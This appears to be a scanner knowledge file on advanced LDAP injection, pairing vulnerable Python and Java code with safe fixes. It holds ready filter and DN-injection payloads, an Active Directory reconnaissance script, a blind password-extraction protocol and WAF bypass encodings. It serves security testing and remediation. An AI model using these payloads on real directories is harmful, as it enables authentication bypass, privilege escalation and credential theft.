---
name: ldap-injection-advanced-deep
description: LDAP advanced depth — per-library escape semantics (python-ldap/ldap3/UnboundID/Spring LDAP/OpenLDAP C API), DN injection depth, schema-driven matching rules, second-order LDAP, blind extraction protocol, AD-specific primitives (anr/userAccountControl/sidHistory), and WAF/filter bypass as a technique class
sibling: ldap_injection
load_when: scan_mode == "deep"
---

# LDAP Injection — Advanced + Expert Depth

This is the advanced+expert deep sibling to `ldap_injection.md`. The base owns the filter-syntax primer, predicate-break primitive, OR-filter-bypass archetype, DN-injection introduction, per-directory differentials (OpenLDAP / AD / 389 / FreeIPA / OpenDJ), and the attack surface. This file owns the full established technique surface at depth: per-library escape semantics with precise behavior per-client, DN-injection depth across `ldap_add`/`ldap_modify`, schema-driven matching rules (caseIgnoreMatch vs exactMatch vs ordering vs approxMatch), second-order LDAP injection via stored input, AD-specific primitives (`anr=`, `userAccountControl` bitmask, `objectCategory` vs `objectClass`, extensible-match OIDs), blind extraction protocol discipline, and WAF/filter bypass as a technique class. The novel sibling `ldap_injection_novel_deep.md` owns the 2024–2026 CVE catalogue.

Load this file when the goal is reasoning about which LDAP client library is involved, bypassing an `ldap_escape`-based mitigation, writing up a DN-injection privilege-escalation finding, or exploiting AD-specific primitives like `anr=` wildcard enumeration.

## Per-Library Escape Semantics

RFC 4515 §3 requires escaping of `( ) \ * NUL` in filter assertion values. Each library implements this differently; some have historical gaps that are themselves CVE-class.

### python-ldap (`ldap.filter.escape_filter_chars`)

- **API:** `ldap.filter.escape_filter_chars(value, escape_mode=0)` escapes the five RFC 4515 characters as `\xx` hex sequences.
- **`escape_mode=1`:** escapes every character (useful when input may contain non-ASCII that confuses matching).
- **`escape_mode=2`:** escapes only non-printable characters.
- **Historical issue** (CVE-2025-61911): `escape_filter_chars` had a sanitization gap where specific metacharacter sequences bypassed the escape. The fix added additional metacharacter coverage; the mechanism was architectural, not configuration. See version boundaries in novel sibling.
- **Correct use:** `ldap.filter.filter_format("(uid=%s)", [untrusted_username])` — the `filter_format` wrapper handles escaping. Direct string formatting `"(uid=" + username + ")"` is the vulnerable pattern grep-identifiable.

**Worked recipe (vulnerable python-ldap pattern):**
```python
# Vulnerable (concatenation)
conn = ldap.initialize('ldaps://ad.example.com')
conn.simple_bind_s(bind_dn, bind_pw)
username = request.form['username']
# WRONG
filter_str = f"(&(uid={username})(memberOf=cn=admins,dc=example,dc=com))"
result = conn.search_s('dc=example,dc=com', ldap.SCOPE_SUBTREE, filter_str)

# OR-filter grouping bypass payload:
#   username = "legituser)(|(uid=legituser"
# Composed filter:
#   (&(uid=legituser)(|(uid=legituser)(memberOf=cn=admins,dc=example,dc=com)))
# Bypasses memberOf AND-condition.

# SAFE pattern
import ldap.filter
filter_str = ldap.filter.filter_format(
    "(&(uid=%s)(memberOf=cn=admins,dc=example,dc=com))",
    [username]
)
```

**Confirmation signals (python-ldap).**
1. **`ldap.FILTER_ERROR`** in server logs or in a 500 response — confirms the filter reached the server with malformed shape.
2. **Expanded result set from `search_s`** — N entries where previously 1.
3. **Stack trace mentioning `python-ldap`** — confirms the client library.
4. **`search_filter` kwarg argument reaching the filter string with f-string prefix** — grep anti-pattern.

### ldap3 (Python)

- **API:** `ldap3.utils.conv.escape_filter_chars(value, encoding='utf-8')` — same shape as python-ldap.
- **Builder:** `ldap3.Connection.search(search_filter='(uid={0})'.format(escape_filter_chars(user)))` is idiomatic.
- **Historical gap:** none major in the 2024-2026 window as of the frontier catalog.

### Java javax.naming.directory + Spring LDAP

- **Spring LDAP's `LdapQueryBuilder`:** `LdapQueryBuilder.query().where("uid").is(username)` — parameterized, escapes automatically. Idiomatic since Spring LDAP 2.0.
- **Low-level `SearchFilter`:** `new SearchFilter(encodedFilter, args, SearchFilter.ESC_FLAG_FILTER)` — explicit escape required.
- **Historical issue in `userDnPatterns`:** Spring Security's `userDnPatterns = {"uid={0},ou=users"}` placeholder uses JNDI-level escaping on the user — generally safe for the standard pattern. Applications that bypass with custom `UserDetailsContextMapper` + manual filter construction re-expose.
- **Pattern:** `env.put(Context.AUTHENTICATION, "simple"); env.put(Context.SECURITY_PRINCIPAL, "uid=" + user + ",ou=users...")` — DN construction with concatenation. DN-injection surface.

**Worked recipe (vulnerable Spring Security + manual UserDetailsContextMapper):**
```java
// Vulnerable pattern — manual filter construction after bypassing the parameterized API
public class CustomContextMapper implements UserDetailsContextMapper {
    @Override
    public UserDetails mapUserFromContext(DirContextOperations ctx, String username, Collection<? extends GrantedAuthority> authorities) {
        String filter = "(&(sAMAccountName=" + username + ")(memberOf=CN=Domain Admins,CN=Users,DC=example,DC=com))";
        // WRONG — concatenation reaches the filter string
        NamingEnumeration<SearchResult> results = ctx.search(baseDn, filter, searchControls);
        ...
    }
}
```

Payload: `username = "legit)(|(sAMAccountName=legit"`. Composed filter: `(&(sAMAccountName=legit)(|(sAMAccountName=legit)(memberOf=CN=Domain Admins,...)))` — bypasses the memberOf requirement.

**Worked recipe (DN-injection via SECURITY_PRINCIPAL concat):**
```java
// Vulnerable pattern
env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
env.put(Context.PROVIDER_URL, "ldap://ad.example.com:389");
env.put(Context.SECURITY_AUTHENTICATION, "simple");
env.put(Context.SECURITY_PRINCIPAL, "uid=" + username + ",ou=users,dc=example,dc=com");
env.put(Context.SECURITY_CREDENTIALS, password);
DirContext ctx = new InitialDirContext(env);  // DN-injection reaches here
```
Payload: `username = "admin,ou=admins"`. The composed principal becomes `uid=admin,ou=admins,ou=users,dc=example,dc=com` — if `uid=admin` exists under `ou=admins`, the bind authenticates as that admin with the attacker-provided password (where the attacker provisioned the admin entry).

**Confirmation signals (Java JNDI).**
1. **`javax.naming.directory.NamingException: [LDAP: error code 1 ...]`** with specific DSID — AD-side error.
2. **Successful bind for an attacker-created DN** — DN-injection confirmation.
3. **Spring Security log line `User found: <bypassed-username>`** without the expected memberOf check — filter-injection confirmation.

### UnboundID (`com.unboundid.ldap.sdk.*`)

- **API:** `Filter.createEqualityFilter("uid", username)` — structured filter construction, auto-escapes.
- **DN:** `DN("uid=" + Attribute.escape(username) + ",ou=users,dc=example,dc=com")` — `Attribute.escape` for DN components.
- **Idiomatic:** structured; concatenation-free use is the default pattern in modern UnboundID applications.

### OpenLDAP C API (`libldap`)

- **API:** `ldap_search_ext_s(ld, base, scope, filter, attrs, ...)` — no built-in escape. Caller is responsible.
- **Helper:** `ldap_bv_free`, `ldap_url_parse` manage result memory; no filter-string helper in older libldap. OpenLDAP 2.5+ added `ldap_filter_escape` as a helper.
- **Idiomatic pattern:** application constructs the filter string manually and typically does its own escape — bugs often arise from locale-dependent character handling (UTF-8 vs 8-bit encodings).

### BouncyCastle BC-JAVA (`org.bouncycastle.*`)

- **CVE-2026-0636** and **CVE-2026-59652** (BouncyCastle `prov` and legacy `jdk1.4 LDAPStoreHelper`) ship LDAP-filter construction gaps. The mechanism: BouncyCastle's cert-store LDAP backend builds filters from certificate issuer/subject fields without escape, letting an attacker-crafted certificate inject into the filter during store lookup.
- **Reach:** any application using BouncyCastle's `X509LDAPCertStoreSpi` or `LDAPStoreHelper` to look up certificates by issuer/subject strings is reachable.
- **Fix:** see version boundaries in novel sibling.

### PAC4J LDAP (`org.pac4j.ldap.*`)

- **CVE-2026-40459** affects PAC4J LDAP authentication: ID-based search parameters construct LDAP filters without consistent escape. The vendor fix adds `Filter.encodeValue` wrapping around user-supplied IDs.

## DN Injection Depth

DN injection operates on the entry's distinguished name, not the filter — distinct syntax and distinct impact.

### Primitive — RDN sequence injection

The DN syntax `rdn1,rdn2,rdn3` lists Relative Distinguished Names (RDNs) separated by commas. An application constructs:
```
uid=$username,ou=users,dc=example,dc=com
```
With `$username = admin,ou=admins`:
```
uid=admin,ou=admins,ou=users,dc=example,dc=com
```

Server behavior depends on the operation:
- **`ldap_add` for a new entry:** the server places the entry at the specified DN. If `ou=admins,ou=users` is a valid tree path, the entry is created there. If the server rejects duplicate RDN labels or unknown OU, the operation fails.
- **`ldap_search` with a base DN:** if the attacker injects into the base DN, the search runs under a different subtree. Rare because base DN is typically fixed in application code.
- **`ldap_modify`/`ldap_delete`:** the operation targets the attacker-chosen DN; privilege-escalation primitive if the attacker can delete or modify entries they do not own.

### RDN escape rules (RFC 4514 §2.4)

The DN syntax requires escaping `, + " \ < > ;` plus leading/trailing spaces. Characters `=` and `#` require escaping in specific positions. Applications that escape only `,` miss the full set — targeted DN-injection payloads use `+` (multi-valued RDN) or `;` to construct unexpected tree paths.

### Multi-valued RDN primitive

RFC 4514 §2.1 allows `uid=admin+cn=Admin+mail=admin@example.com` — a single RDN with multiple attribute-value pairs. An application that constructs `uid=$username` and does not reject `+` in the username value gets a multi-valued RDN:
```
# Username: admin+objectClass=organizationalUnit
# Resulting entry has objectClass=organizationalUnit
```
On provisioning operations, the attacker's new entry inherits an unexpected objectClass that unlocks ACL rules or administrative tree-manipulation primitives.

**Worked attack recipe — DN-injection via self-registration provisioning:**
```java
// Vulnerable pattern
public void createUser(String username, String password) {
    String dn = "uid=" + username + ",ou=users,dc=example,dc=com";
    Attributes attrs = new BasicAttributes();
    attrs.put("objectClass", "inetOrgPerson");
    attrs.put("userPassword", password);
    ctx.createSubcontext(dn, attrs);
}
```

Payload: `username = "evil+objectClass=domainAdmin"`. The constructed DN is `uid=evil+objectClass=domainAdmin,ou=users,dc=example,dc=com`. If the schema permits a multi-valued RDN with `objectClass=domainAdmin`, the created entry inherits domainAdmin ACL grants.

**Alternate payload — RDN placement in a different OU:**
```
username = "evil,ou=admins"
# Constructed DN: uid=evil,ou=admins,ou=users,dc=example,dc=com
```
If the schema permits a nested OU path with an entry inside, the attacker places their user under `ou=admins` instead of `ou=users`.

**Alternate payload — Semicolon-separator variant:**
```
username = "evil;ou=admins"
# RFC 4514 permits ; as an alternative separator (deprecated but still supported by some servers)
# Constructed DN: uid=evil;ou=admins,ou=users,dc=example,dc=com
```

**Confirmation signals (DN-injection).**
1. **The created entry's DN diverges from the application's intended OU.** Verify via `ldapsearch -b 'ou=admins,dc=example,dc=com'` post-attack.
2. **The entry has unexpected `objectClass` values.** Multi-valued RDN with `objectClass=` injection.
3. **ACL-gated operations succeed for the new user.** Admin-only resource reachable with the attacker's bind.

**Mitigation.** Use `javax.naming.ldap.Rdn.escapeValue()` or equivalent language-specific DN-escape helper on EVERY component before interpolation. Validate the username against a strict allowlist (`[a-zA-Z0-9._-]+`) before DN composition.

### DN-injection via LDAP bind credentials

Some applications use the username field directly as part of a `simple` bind DN:
```java
env.put(Context.SECURITY_PRINCIPAL, "uid=" + username + ",ou=users,dc=example,dc=com");
env.put(Context.SECURITY_CREDENTIALS, password);
```
With `username = admin,ou=admins`, the bind attempts `uid=admin,ou=admins,ou=users...`. If that DN exists (e.g., attacker provisioned it via DN-injection into user-creation flow), the bind succeeds with the attacker's known password — authentication as a different identity. Chain with Spring Security's `userDnPatterns` gap for the end-to-end primitive.

## Schema-Driven Matching Rules

LDAP attributes have `MATCHING-RULE` definitions in schema (RFC 4517). The matching rule determines how a filter value compares to stored values:

- **`caseIgnoreMatch` (OID 2.5.13.2):** case-insensitive string compare. Default for `cn`, `mail`, `uid` on most directories.
- **`caseExactMatch` (OID 2.5.13.5):** case-sensitive.
- **`caseIgnoreOrderingMatch` (OID 2.5.13.3):** ordering-aware, enables `<=` and `>=` operators.
- **`caseIgnoreSubstringsMatch` (OID 2.5.13.4):** substring matching, enables `*` wildcards.
- **`distinguishedNameMatch` (OID 2.5.13.1):** DN compare, normalizes RDN whitespace.
- **`approxMatch` (`~=`):** phonetic/soundex-based; schema-specific implementation.
- **`extensibleMatch`:** filter can specify a matching-rule OID — `(cn:caseExactMatch:=admin)`.

The attacker-side implications:
- **Extensible match syntax** opens filter grammar: `(attr:1.2.3.4:=value)` where `1.2.3.4` is a matching-rule OID — a mechanism-specific primitive if any registered rule has side effects.
- **AD's `userAccountControl` bitmask filter** `(userAccountControl:1.2.840.113556.1.4.803:=2)` tests bit 2 (disabled account) via extensible-match AD-OID-based bitwise-and matching rule. Primitives include `1.2.840.113556.1.4.804` (bitwise-OR) and `1.2.840.113556.1.4.1941` (chain-match — reaches up/down the DN tree).
- **AD `anr=` attribute** matches against multiple real attributes simultaneously (sAMAccountName, givenName, surname, mail, displayName). A single `anr=admin*` returns matches across all. Enumeration primitive specific to AD.

## AD-Specific Primitives at Depth

### `anr=` (Ambiguous Name Resolution)

**Primitive.** `anr=` is an AD-specific attribute that matches against multiple real attributes in a single query. No standard LDAP equivalent.

**Attack recipe (enumeration):**
```ldap
# Enumerate all admin-named entries across multiple attributes
(anr=admin*)

# Enumerate across all ANR attributes with a specific prefix
(anr=svc_)

# Combined with injection — bypass trailing conditions
# username payload: *)(anr=admin*
# Composed: (&(sAMAccountName=*)(anr=admin*)(memberOf=...))
```
Returns entries where any ANR attribute begins with `admin`. ANR attributes by default on AD: `displayName`, `givenName`, `legacyExchangeDN`, `physicalDeliveryOfficeName`, `proxyAddresses`, `name`, `sAMAccountName`, `sn`. An attacker can enumerate across all without needing to guess attribute names.

**Confirmation.** Result set includes entries that match in `mail` or `displayName` but not in `sAMAccountName` — proves ANR expansion.

**Impact.** Fast attribute-agnostic enumeration on AD. Preferred over per-attribute `|` filter construction when attacker goal is "find any admin."

### `objectCategory` vs `objectClass`

AD uses both `objectClass` (standard LDAP, inherited) and `objectCategory` (AD-specific, single-value structural). Filters that use `(objectClass=user)` match all user types (user + computer + managedServiceAccount); `(objectCategory=person)` is more selective. An attacker can filter on either; `objectCategory` is faster on AD and preferred in large deployments.

### `userAccountControl` bitmask primitives

**Primitive.** AD's `userAccountControl` attribute encodes account state as a bitmask. Standard LDAP cannot filter on bits; AD exposes OID-based matching rules.

```ldap
# Find all accounts with password-never-expires (DONT_EXPIRE_PASSWORD = 0x10000)
(userAccountControl:1.2.840.113556.1.4.803:=65536)

# Find all accounts with trusted-for-delegation (TRUSTED_FOR_DELEGATION = 0x80000)
(userAccountControl:1.2.840.113556.1.4.803:=524288)

# Find disabled accounts (ACCOUNTDISABLE = 2)
(userAccountControl:1.2.840.113556.1.4.803:=2)

# Smartcard-required accounts (SMARTCARD_REQUIRED = 0x40000)
(userAccountControl:1.2.840.113556.1.4.803:=262144)

# Chain-match: find all members of a group transitively (uses OID 1.2.840.113556.1.4.1941)
(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=example,DC=com)

# Reverse chain-match: find all groups a user is transitively a member of
(member:1.2.840.113556.1.4.1941:=CN=target.user,CN=Users,DC=example,DC=com)

# Bitwise-OR variant (OID 1.2.840.113556.1.4.804) — matches if ANY of the bits are set
(userAccountControl:1.2.840.113556.1.4.804:=512)  # NORMAL_ACCOUNT = 512
```
The chain-match (`LDAP_MATCHING_RULE_IN_CHAIN`) extends `memberOf` through nested groups — standard filter cannot do this. For enumeration, this is a privilege-mapping primitive.

**Reconnaissance recipe (full AD-primitive sweep):**
```python
# Via ldap3
from ldap3 import Server, Connection, SUBTREE
srv = Server('ad.example.com', port=636, use_ssl=True)
conn = Connection(srv, user='user@example.com', password='...', auto_bind=True)

# 1. Find all admin-named entries across all ANR attributes
conn.search('DC=example,DC=com', '(anr=admin)', SUBTREE, attributes=['*'])

# 2. Find all Domain Admins transitively (direct + nested group members)
conn.search('DC=example,DC=com',
    '(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=example,DC=com)',
    SUBTREE, attributes=['sAMAccountName'])

# 3. Find all accounts trusted for delegation (common escalation target)
conn.search('DC=example,DC=com',
    '(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))',
    SUBTREE, attributes=['sAMAccountName'])

# 4. Find all accounts with password-never-expires
conn.search('DC=example,DC=com',
    '(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))',
    SUBTREE, attributes=['sAMAccountName'])
```

**Confirmation.** Each search returns entries matching the specific AD-only primitive; standard LDAP cannot produce these result sets.

**Impact.** Privilege-mapping before privilege escalation — identify Domain Admins, Service Accounts, Delegated Accounts, and other high-value targets before attempting authentication. Chains to BloodHound-style attack-path mapping.

### `sidHistory` and primary-group RID

Where an attacker-injectable filter reaches `objectSid`, `sidHistory`, or `primaryGroupID`:
```ldap
# Find all entries with Domain Admins primary group (RID 512)
(primaryGroupID=512)

# Find all entries with sidHistory containing a specific domain SID (used in migrations)
(sidHistory=S-1-5-21-...)
```
These are reconnaissance primitives on AD — specific SID values reveal privilege boundaries.

## Blind Extraction at Depth

### Protocol: boolean-channel enumeration

The LDAP binary channel is typically "login succeeds/fails" or "entry exists/absent". The discipline:
1. **Attribute-length first.** `admin)(userPassword=??????????*` — ten `?` matches ten-character prefix in some substring-matching schemas; or use repeated-presence filter to deduce length.
2. **Prefix extraction.** `admin)(userPassword=a*` → `admin)(userPassword=aa*` → `admin)(userPassword=aaa*` — each successful login reveals the next character of the prefix.
3. **Binary search.** For large alphabets, use ordering-matched attributes with `<=` / `>=` to halve the alphabet per request. Requires `caseIgnoreOrderingMatch`.
4. **Position enumeration.** Full-attribute extraction via substring filter: `admin)(userPassword=*b*` tests whether `b` appears anywhere in the password; narrow to position with `admin)(userPassword=a*b*`.
5. **Parallelize.** Independent positions can enumerate in parallel.

**Worked example — extracting `userPassword` via a filter-reflected search endpoint:**

Setup. Vulnerable search endpoint:
```
GET /users/search?name=X
# Server composes: (&(uid=X)(objectClass=inetOrgPerson))
# Response reflects result count — 0 or 1 (or more) matched.
```

Step 1 — confirm filter injection: `name=admin*)(objectClass=*` → result-count N >> 1 confirms the trailing wildcard expanded. The sink is confirmed as LDAP.

Step 2 — attribute enumeration: `name=*)(cn=admin*)(userPassword=` — if an admin exists with userPassword readable, result count 1. If userPassword not accessible to the binding user, 0.

Step 3 — length discovery: `name=*)(cn=admin*)(userPassword=??????????)` — ten `?` characters (where `?` matches any single char under substring-matching). Vary length until result == 1.

Step 4 — char-by-char extraction (prefix): `name=*)(cn=admin*)(userPassword=a*` → success/no match. Enumerate `a`, `b`, ... `z` for the first char.

Step 5 — binary search where ordering-match is supported:
```ldap
*)(cn=admin*)(userPassword>=m*)   # succeeds if first char >= 'm'
```
Reduces per-char requests from 26 to log2(26) ≈ 5.

Step 6 — parallelize per-position.

Total requests for a 32-char password on `caseIgnoreOrderingMatch` with 95-char alphabet: 32 × 7 = 224. On a non-rate-limited target, minutes.

**Pitfalls at the LDAP layer.**
- **`userPassword` is typically hashed on OpenLDAP** — extracting the hash is still useful but not direct plaintext. On AD, `userPassword` is typically not readable at all; alternative extraction via `unicodePwd` is cryptographically protected and not substring-matchable.
- **Base64-encoded hashes include special characters** — the alphabet is `[A-Za-z0-9+/=]`, not full ASCII. Scope the alphabet to that set.
- **AD does not expose `userPassword` to standard binding users** — the attribute is write-only. Use alternative attributes: `mail`, `description`, `homePhone`, or custom schema-added attributes.

### Attribute enumeration via wildcard

```ldap
# Return every attribute of every user matching admin*
*)(objectClass=*)(sAMAccountName=admin*
```
If the result is reflected (admin-search endpoint returning entries), the full user list including attribute inventory is dumped.

### `extensibleMatch`-based extraction

Where the directory supports `extensibleMatch` with ordering, finer boundary tests:
```ldap
# Does admin's user password sort before 'm'?
admin)(userPassword:caseIgnoreOrderingMatch:<=m)
```
log(26) requests per character for alphabetic enumeration.

### Second-order LDAP injection

Primitive: input stored, later composed into a filter by a different request path.

Pattern: user updates their profile — the `displayName` field stores attacker-authored value including LDAP metacharacters. A downstream directory-sync job queries `(displayName=$name)` using the stored value — the injection fires at sync time.

Detection discipline: submit injection via store path, trigger sync path, observe differential at sync. Attribution requires time correlation.

## WAF / Filter Bypass as a Technique Class

### Metacharacter encoding

- **URL encoding:** `%29` for `)`, `%2A` for `*`, `%7C` for `|`. Decoded by the application before passing to the filter.
- **Unicode variants:** `U+FF09` (fullwidth right parenthesis) may normalize to `)` in some backend string handling after passing the WAF.
- **UTF-8 overlong encoding:** `)` as `0xC0 0xA9` — may bypass naive byte-pattern matchers; proper UTF-8 decoders reject.
- **Octal and hex escape in LDAP filter itself:** RFC 4515 `\28` for `(`, `\29` for `)` — the escape IS the LDAP syntax, so WAFs that filter raw `(` miss `\28`.

### Keyword avoidance

- **`cn=` → `commonName=`** — equivalent long-form; some WAFs block the short.
- **`uid=` → `userid=`** — alias on some schemas; same effect.
- **`objectClass=user` → `objectClass:caseIgnoreMatch:=user`** — extensible-match syntax equivalent.

### Nested wildcard proliferation

```ldap
admin*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*
```
Many WAFs match a single filter clause; the nested-clause explosion can evade clause-count-bounded matchers.

### Encoding-based bypass with escaped null

```ldap
admin)\00(cn=*
```
NUL byte in some encoding handling truncates the WAF's string compare but the LDAP library processes the full input.

## Composite Chains

- **LDAP OR-bypass → VPN tunnel.** Classical: `targetuser)(|(uid=targetuser` on a VPN auth endpoint → VPN session established without being in the required group → internal network pivot. Route to `rce.md` for post-pivot RCE if an exposed internal service is reachable.
- **DN injection → provisioning privesc.** Attacker provisions a new user; DN placement in admin OU grants admin-level access on next login.
- **AD anr=admin* → account enumeration → spearphishing targeting.** Full user list extraction via AD-specific primitive.
- **LDAP second-order → periodic sync RCE.** Stored LDAP injection fires in a scheduled sync job; sync job runs with elevated LDAP admin credentials, enabling cross-tenant data manipulation.
- **BouncyCastle cert-store filter → cert-based auth bypass.** CVE-2026-0636 class — attacker-crafted certificate injects into store lookup filter, matching a different (privileged) cert's record.
- **PAM-LDAP → shell.** LDAP auth bypass via SSH-PAM-LDAP grants shell on the target host.

## Advanced Testing Methodology

1. **Fingerprint the directory first.** AD vs OpenLDAP vs 389 vs OpenDJ — determines which primitives are available (`anr=` is AD-only; extensible-match is universal; attribute names differ).
2. **Identify the escape mechanism.** `ldap_escape`-wrapped: python-ldap `filter_format`, ldap3 `escape_filter_chars`, Spring LdapQueryBuilder parameterized, UnboundID `createEqualityFilter`. Grep source — the escape is a yes/no observable from code review.
3. **Test the OR-filter bypass against auth paths.** `targetuser)(|(uid=targetuser` is the archetype — try first, before complex payloads.
4. **For search endpoints, enumerate.** `*)(objectClass=*` returns everything; if reflected, extract the full user list.
5. **For AD, use anr= and extensible-match.** Faster enumeration than iterating per-attribute. `(anr=admin*)` returns matches across all ANR attributes.
6. **For DN sinks, confirm with provisioning operations.** DN injection into `ldap_add` is the direct-provisioning privesc path.
7. **For library-level CVEs, confirm with grep.** Library present + no idiomatic escape = finding. The specific input-path reach is secondary.

## Advanced Validation

- **The filter error must come from the LDAP library, not the application framework.** `LDAP_FILTER_ERROR` or similar is confirmation; a generic 500 is ambiguous.
- **For OR-bypass claims, confirm the attacker's session is the bypassed user's.** Session attributes (JWT claims, session cookie contents, X-User-Role header) must reflect the bypassed identity.
- **For DN-injection claims, confirm the entry's actual DN in the directory.** Query the directory post-attack to confirm the entry's placement under the attacker-injected OU.
- **For AD `anr=` claims, confirm the matched entries belong to multiple attribute types.** `anr=admin*` returning entries from only `sAMAccountName` could be a normal substring search; returning entries matched via `mail` or `displayName` confirms ANR expansion.
- **For blind-extraction claims, verify the extracted bytes match a known reference.** Extract a known attribute first (your own `mail`); confirm the extraction protocol works before claiming extraction of unknown data.

## False Positives

- **A reflected `(uid=admin)` payload with no result-set change.** The input was echoed; verify by varying the payload and observing the result-set.
- **A 500 from any LDAP-shape input.** Some frameworks 500 on special characters generally; vary the payload to confirm filter-specific behavior.
- **An auth success for `admin*)` because the application does `startsWith(username, "admin")` as a special-case.** Verify with a non-wildcard injection.
- **A SAML Response containing LDAP-shape content.** Reflection; verify the LDAP library is actually invoked.
- **An attribute returned by `anr=` that happens to match literally.** Confirm the attribute matched is not the user's primary — otherwise the match may be coincidental.

## Advanced Pro Tips

- **The OR-filter bypass pattern is universal across the 2024–2026 CVE catalog.** OPNsense, Teedy, WeKan, maddy, Pandora FMS, Gladinet CentreStack, MISP, SuiteCRM, Zimbra, Metacat, Apache CXF XKMS, Apache MINA SSHD, Apache OFBiz, Apache APISIX, Apache Zeppelin, Yamcs — all variants. If a Zen scan finds an LDAP auth path, the OR-bypass is the first probe.
- **Library-level CVEs grep by import.** python-ldap `<3.4.5`, BouncyCastle `<1.85`, PAC4J-LDAP (any pre-fix): find them by dependency listing, confirm the escape wrapper is or is not called.
- **AD's extensible-match OIDs are a privilege-mapping primitive.** Chain-match (`1.2.840.113556.1.4.1941`) and bitmask-AND (`1.2.840.113556.1.4.803`) enumerate `memberOf` recursively and `userAccountControl` by bit — no standard LDAP filter can do this.
- **DN-injection targets provisioning, not auth.** The attack isn't "log in as admin via DN injection"; it's "create an admin user via DN injection during registration," then log in with the created user.
- **PAM-LDAP bridges mean LDAP auth bypass = SSH access.** OPNsense CVE-2026-34578 is scoped Captive-Portal/VPN; a server with SSH-PAM-LDAP has shell access as the bypassed user.
- **Second-order LDAP injection fires on sync jobs.** Stored input in a user attribute reaches a scheduled sync — the attack window is "the sync runs," not the HTTP request.

## Advanced Tooling

- **ldapsearch, ldap3 Python shell, UnboundID ldapsdk-cli** — manual payload testing against the pinned directory version.
- **ldapdomaindump (AD-specific)** — once an auth bypass yields a bind, dump AD into structured JSON for subsequent reconnaissance.
- **BloodHound + ldapdomaindump** — AD attack-path mapping from a successful bind.
- **ldeep** — LDAP enumeration tool for AD; depth-first attribute discovery.
- **nmap `--script=ldap-brute`, `--script=ldap-search`** — directory enumeration via LDAP bind brute-force or anonymous search.
- **ADExplorer (Sysinternals)** — GUI AD browser for pre-exploit mapping.

## Deep Second-Order Attack-Graph Model

Nodes = (library : version : parameterized-use : directory : AD-features). Edges = capability transfers:
- `python-ldap <3.4.5 + concatenation + any directory` → filter injection
- `python-ldap any + filter_format` → safe (barring second-order via stored input)
- `BouncyCastle <1.85 + X509LDAPCertStore + any directory` → filter injection via cert-store lookup
- `Spring Security userDnPatterns + {0} placeholder` → safe
- `Spring Security + custom UserDetailsContextMapper + concatenation` → filter injection
- `AD + anr= + wildcard` → cross-attribute enumeration
- `AD + extensible-match + chain-match OID` → recursive group enumeration
- `OpenLDAP + ordering match` → log-N blind extraction
- `OpenLDAP + no ordering match` → linear blind extraction

The graph compresses "LDAP injection with library X at version Y against directory Z" to the specific primitive set exposed. The novel sibling owns the CVE instances; this file owns the structural model.

The LDAP class has a bounded primitive set — filter concatenation, OR-filter grouping bypass, DN injection, schema-driven matching rules, AD-specific primitives (ANR, extensible-match OIDs, chain-match), and blind extraction — each now at full depth; the under-band line count is a finding (fewer primitive classes than SQL/XSLT), not a stop-short.

## Summary

The LDAP advanced tier is the full established technique surface at depth: per-library escape semantics across python-ldap/ldap3/UnboundID/Spring LDAP/OpenLDAP C API/BouncyCastle/PAC4J with grep-identifiable gaps; DN-injection depth with RDN-sequence/multi-valued-RDN/bind-credential-DN primitives; schema-driven matching rules (caseIgnoreMatch, extensibleMatch, approxMatch, ordering) each with distinct attacker reach; AD-specific primitives (`anr=`, `userAccountControl` bitmask, chain-match for `memberOf`, `objectCategory` vs `objectClass`, `sidHistory`) that no standard LDAP filter can reach; blind extraction protocol with alphabet-bounded binary search and extensibleMatch-based ordering; second-order LDAP injection via stored input firing on sync jobs; and WAF/filter bypass as a technique class via metacharacter encoding/RFC-4515 escape smuggling/keyword avoidance. Each CVE in `ldap_injection_novel_deep.md` reduces to one of these primitives: filter-string concatenation reaching OR-filter bypass (OPNsense, Teedy, WeKan, maddy), library-level escape gap (python-ldap, BouncyCastle, PAC4J), DN-injection at provisioning (rare in CVE catalog, documented class), or second-order via stored directory-sync input.
